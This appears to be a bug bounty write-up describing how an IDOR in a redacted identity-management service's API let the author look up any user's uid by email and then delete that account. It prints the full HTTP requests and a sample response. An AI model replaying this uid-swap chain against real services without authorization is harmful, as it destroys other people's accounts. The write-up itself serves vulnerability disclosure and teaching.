---
title: "How Was I Able to Delete Any Account of an Organization Using Idor"
date: 2021-09-10T09:37:47+05:30
draft: false
toc: false
images:
tags:
  - IDOR
  - bug bounty
---

Hello, amazing hackers my name is Sudip Roy and i am an InfoSec student and part-time Bug Hunter.This is my first writeup about a critical vulnerability which i found on a website(Vdp). Hope you guys will like it and learn something new from it.

Lets get started, The website provides cloud-based consumer identity and access management (CIAM) solution. For testing purposes i signup using my account, select developer pro(extra features), created a app and looked for every features of the website, 1 hour later i decided to play with the delete account feature from the settings page. I request for the delete account and checked the request in burpsuite and send the request to repeater and drop it.

The request looked like this(1st IDOR):

    DELETE /account/customer? HTTP/1.1
    Host: redacted-api.redacted.com
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
    Accept: application/json, text/plain, */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/json
    Content-Length: 42
    X-Is-redacted--Sign: <some-token>
    X-Is-redacted--Token: <some-token>
    X-Is-redacted-Ajax: true
    Cache-Control: no-store,max-age=0
    Origin: https://dashboard.redacted.com
    Referer: https://dashboard.redacted.com/profile
    Te: trailers
    Connection: close

    {"uid":"4adddbea4e3646a0b951ce4822075707"}

Now, after looking the request, we can easily identify uid(user identification) parameter is used so the website maybe prone to idor. I made 2nd account and request for the delete account feature, the request was exactly same and uid is different. I copy the uid code of the 2nd account and replace uid code with first request’s code. After sending the request the my 2nd account was successfully deleted.(1st IDOR)

Here the impact is nothing because how will the attacker get’s the victim’s uid. So i needed to find the victim’s uid.

After spending some time with the website, i found that i can invite a team-member to my app which i created when signing up in the website. So i invited the user to my app and checked the requests made by website. While checking i found this interesting request:

    GET /team/userprofile?email=nexas60891%40rebation.com& HTTP/1.1
    Host: adminconsole-api.redacted.com
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
    Accept: application/json, text/plain, */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    X-Is-redacted--Sign: <some-token>
    X-Is-redacted--Token: <some-token>
    X-Is-redacted-Ajax: true
    Cache-Control: no-store,max-age=0
    Origin: https://dashboard.redacted.com
    Referer: https://dashboard.redacted.com/teams
    Te: trailers
    Connection: close

I send the request to the repeater and send the request. The request showed some information related to the victim’s email including uid code. Response:

    HTTP / 1.1 200 OK
    Server: nginx
    Date: Fri, 10 Sep 2021 05: 11: 57 GMT
    Content - Type: application / json;
    charset = utf - 8
    Connection: close
    aca - request - id: 9 f2c40e0 - 11 f5 - 11e c - b525 - 9 f29fd8a2e9a
    Access - Control - Allow - Headers: Content - Type, Cache - Control, Authorization, Content - Length, X - Requested - With, X - Is - redacted - Ajax, X - Is - redacted--Token, X - Is - redacted--Sign
    Access - Control - Allow - Methods: GET, PUT, POST, DELETE, OPTIONS
    Access - Control - Allow - Origin: https: //dashboard.redacted.com
      ETag: W / "d8d-UnkAQfkFjrEDJEI34fj1dAMTHHw"
    Strict - Transport - Security: max - age = 1234000;
    includeSubDomains
    Vary: Origin, Accept - Encoding
    X - Frame - Options: SAMEORIGIN
    X - Powered - By: PHP 5.2.0
    X - XSS - Protection: 1;
    mode = block
    X - Server: admin_root_primary
    Access - Control - Max - Age: 3600
    Content - Length: 3469

    {
      "Identities": null,
      "Password": "**********",
      "LastPasswordChangeDate": null,
      "PasswordExpirationDate": "2021-12-08T11:51:01.6230000Z",
      "LastPasswordChangeToken": null,
      "EmailVerified": true,
      "IsActive": true,
      "IsDeleted": false,
      "Uid": "858fb2cafd0c454096322e30d059722a",
      "CustomFields": {
        "IsPrivacyPolicyAccepted": "false",
        "gclid": "",
        "utm_campaign": "",
        "utm_medium": "",
        "utm_source": "",
        "cf_PlanType": "{\"rebation-roqagari\":\"free\"}",
        "roleInfo": "{\"role\":\"Developer\",\"lookingFor\":\"for product research\"}"
      },
      "IsEmailSubscribed": false,
      "UserName": null,
      "NoOfLogins": 2,
      "PhoneId": null,
      "PhoneIdVerified": false,
      "Roles": null,
      "ExternalUserLoginId": null,
      "RegistrationProvider": "Email",
      "IsLoginLocked": false,
      "LoginLockedType": "None",
      "LastLoginLocation": "redacted, India",
      "RegistrationSource": "https://accounts.redacted.com/auth.aspx?return_url=https://dashboard.redacted.com/login&action=register&source=email",
      "IsCustomUid": false,
      "UnverifiedEmail": null,
      "IsSecurePassword": null,
      "PrivacyPolicy": null,
      "ExternalIds": null,
      "IsRequiredFieldsFilledOnce": true,
      "ConsentProfile": null,
      "PIN": null,
      "RegistrationData": null,
      "ID": "69877142c7644ef8a954a0a07f05cdca",
      "Provider": "Email",
      "Prefix": null,
      "FirstName": "Victim",
      "MiddleName": null,
      "LastName": null,
      "Suffix": null,
      "FullName": "Victim",
      "Email": [{
        "Type": "Primary",
        "Value": "nexas60891@rebation.com"
      }],
      "Country": null,
      "Positions": null,
      "Educations": null,
      "PhoneNumbers": null,
      "IMAccounts": null,
      "Addresses": null,
      "MainAddress": null,
      "Created": null,
      "CreatedDate": "null",
      "ModifiedDate": "null",
    }

I copy the uid from this response and replace with uid code in the 1st acccount’s request -> Send the request -> The victim’s account was permanently deleted.

- Another thing i noticed that [https://adminconsole-api.redacted.com/team/userprofile?email=](https://adminconsole-api.redacted.com/team/userprofile?email=)& HTTP/1.1 This email parameter takes any email and return it’s uid so i can delete any dev. or admin’s account easily.

Takeaways:

1.  Always checks for idor if any uid/guid or number present in the request and check every http request using burp.
2.  One IDOR tip ->
    ![https://twitter.com/intigriti/status/1217794181982302208/photo/1](https://pbs.twimg.com/media/EOZ5WtnXkAMMGqA?format=png&name=small)

Thankyou, for reading :v: You can follow me, I retweet and tweet related to Bug Bounty and InfoSec -> [https://twitter.com/0xsudip](https://twitter.com/0xsudip)
